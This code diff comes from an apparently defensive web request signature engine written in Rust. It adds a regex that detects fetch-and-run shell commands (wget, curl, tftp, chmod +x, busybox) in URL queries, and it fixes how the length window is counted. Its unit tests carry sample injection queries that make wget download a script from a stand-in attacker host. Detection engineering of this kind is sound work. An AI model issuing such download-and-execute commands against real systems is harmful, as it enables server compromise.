@@ -265,7 +265,7 @@ impl SignatureEngine {
                         ok = false;
                         break;
                     };
-                    if name == "fetch-and-run" {
+                    if name == "fetch-and-run" && pattern == DEFAULT_FETCH_AND_RUN_PATTERN {
                         compiled.push(QueryRuleEntry {
                             name,
                             matcher: CompiledQueryRule::FetchAndRun,
@@ -691,6 +691,8 @@ pub fn is_unusual_method_probe(method: &str, profile: &str) -> bool {
     false
 }
 
+const DEFAULT_FETCH_AND_RUN_PATTERN: &str = r"(?:^|[;&|]\s*)(?:(?:wget|curl)\s+(?=[^;&|\r\n]{0,384}(?:https?|ftp)://)|tftp\s+(?:-g\b|-r\b|[0-9])|chmod\s+\+?x\b|busybox\s+(?:wget|curl|tftp)\b)";
+
 /// Linear-time implementation of Python's `fetch-and-run` query rule without lookahead backtracking:
 /// `(?:^|[;&|]\s*)(?:(?:wget|curl)\s+(?=[^;&|\r\n]{0,384}(?:https?|ftp)://)|tftp\s+(?:-g\b|-r\b|[0-9])|chmod\s+\+?x\b|busybox\s+(?:wget|curl|tftp)\b)`
 fn match_fetch_and_run(value: &str) -> bool {
@@ -700,22 +702,43 @@ fn match_fetch_and_run(value: &str) -> bool {
     let re = fetch_and_run_wget_curl_regex();
     for m in re.find_iter(value) {
         let rest = &value[m.end()..];
-        let mut window_end = rest.len();
-        for (i, b) in rest.bytes().enumerate() {
-            if i >= 384 || matches!(b, b';' | b'&' | b'|' | b'\r' | b'\n') {
-                window_end = i;
-                break;
+        let delim = rest
+            .bytes()
+            .position(|b| matches!(b, b';' | b'&' | b'|' | b'\r' | b'\n'))
+            .unwrap_or(rest.len());
+        let segment = &rest[..delim];
+        let max_prefix_bytes = segment
+            .char_indices()
+            .nth(384)
+            .map(|(idx, _)| idx)
+            .unwrap_or(segment.len());
+        let search_end = (max_prefix_bytes + 8).min(segment.len());
+        let window = &segment.as_bytes()[..search_end];
+        for scheme in [
+            b"http://".as_slice(),
+            b"https://".as_slice(),
+            b"ftp://".as_slice(),
+        ] {
+            if let Some(pos) = find_ascii_case_insensitive(window, scheme) {
+                if pos <= max_prefix_bytes {
+                    return true;
+                }
             }
-        }
-        let window = &rest.as_bytes()[..window_end];
-        if contains_ascii_case_insensitive(window, b"http://")
-            || contains_ascii_case_insensitive(window, b"https://")
-            || contains_ascii_case_insensitive(window, b"ftp://")
-        {
-            return true;
         }
     }
     false
+}
+
+fn find_ascii_case_insensitive(haystack: &[u8], needle: &[u8]) -> Option<usize> {
+    if needle.is_empty() {
+        return Some(0);
+    }
+    if haystack.len() < needle.len() {
+        return None;
+    }
+    haystack
+        .windows(needle.len())
+        .position(|w| w.eq_ignore_ascii_case(needle))
 }
 
 /// Percent-decode a UTF-8 string (lossy on invalid sequences, matching `urllib.parse.unquote`).
@@ -1047,3 +1070,46 @@ const BUILTIN_USER_AGENTS: &[(&str, &str)] = &[
     ("leakix", "survey"),
     ("l9explore", "survey"),
 ];
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn fetch_and_run_matches_scheme_at_384_char_boundary() {
+        let prefix = "a".repeat(384);
+        let q = format!("/?cmd=wget+{prefix}https://evil.example/a.sh");
+        assert_eq!(
+            SignatureEngine::builtin().classify_query(&q),
+            "fetch-and-run"
+        );
+
+        let too_far = "a".repeat(385);
+        let q_far = format!("/?cmd=wget+{too_far}https://evil.example/a.sh");
+        assert_eq!(SignatureEngine::builtin().classify_query(&q_far), "");
+    }
+
+    #[test]
+    fn custom_fetch_and_run_regex_in_json_is_honored() {
+        let tmp = std::env::temp_dir().join(format!("guardd-sig-test-{}.json", std::process::id()));
+        let payload = serde_json::json!({
+            "version": "test-custom",
+            "decisive": ["secrets"],
+            "paths": {"/.env": "secrets"},
+            "segments": {".env": "secrets"},
+            "traps": [],
+            "queries": {
+                "fetch-and-run": "custom_fetch_marker_[0-9]+"
+            },
+            "user_agents": {"sqlmap": "scanner-tool"}
+        });
+        std::fs::write(&tmp, payload.to_string()).unwrap();
+        let eng = SignatureEngine::from_file(&tmp).unwrap();
+        let _ = std::fs::remove_file(&tmp);
+        assert_eq!(
+            eng.classify_query("/?x=custom_fetch_marker_42"),
+            "fetch-and-run"
+        );
+        assert_eq!(eng.classify_query("/?x=wget+https://evil.example/a.sh"), "");
+    }
+}
